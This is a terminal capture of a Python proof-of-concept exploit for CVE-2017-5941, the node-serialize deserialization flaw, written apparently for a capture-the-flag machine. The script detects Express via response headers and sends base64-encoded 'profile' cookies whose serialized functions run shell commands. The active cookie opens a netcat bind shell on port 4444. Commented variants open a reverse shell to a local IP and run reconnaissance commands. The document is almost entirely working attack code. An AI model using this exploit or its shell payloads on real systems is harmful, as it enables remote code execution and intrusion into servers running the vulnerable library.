root@nippur:/var/www/html/a# cat /home/c/ctf/tod/expRcEss_js.py
#!/usr/bin/env python
# expRcEss_js.py - simple poc for CVE-2017-5941
#
# more details:
#   https://nvd.nist.gov/vuln/detail/CVE-2017-5941
#   https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
#   https://code610.blogspot.com/2019/03/temple-of-doom1-ctf.html
# 
# 24.02.2019@22:00
#
import sys, requests

target = sys.argv[1]
target_port = sys.argv[2]

sess = requests.session()

check_url = 'http://' + target + ':' + target_port
check_req = sess.get(check_url)
check_resp = check_req.text
found_headers = check_req.headers['X-Powered-By']


print '[i] Connecting to %s on port %s' % ( target, target_port )

if 'Express' in found_headers:
  print '[+] Node.js Express identified by headers; proceeding...'

  print '[i] Creating final request'
  # nc ip 4444 -e /bin/sh
  #profile_cookie = "eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JldHVybiByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ25jIDE5Mi4xNjguMS4xNjAgNDQ0NCAtZSAvYmluL3NoJywoZSxvdXRvLGVycik9Pntjb25zb2xlLmxvZyhvdXQpO30pO30oKSJ9"
  # nc -lvvp 4444 -e /bin/sh
  #profile_cookie = "eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JldHVybiByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ25jIC1sdnZwIDQ0NDQgLWUgL2Jpbi9zaCAmJywoZSxvdXRvLGVycik9Pntjb25zb2xlLmxvZyhvdXQpO30pO30oKSJ9"
  profile_cookie = "eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnbmMgLWx2dnAgNDQ0NCAtZSAvYmluL3NoJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7fSgpIn0KCg=="
  #profile_cookie = "eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnaWQ7bHM7cHdkO3dob2FtaTt1bmFtZSAtYScsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9Cgo="


  profile_cookies = {'profile':profile_cookie}
  print profile_cookies

  fin_req = sess.get(check_url, cookies=profile_cookies)
  fin_resp = fin_req.text

  print '[+] shell should be ready now.'
  print fin_resp


print '\n[+] poc finished.'

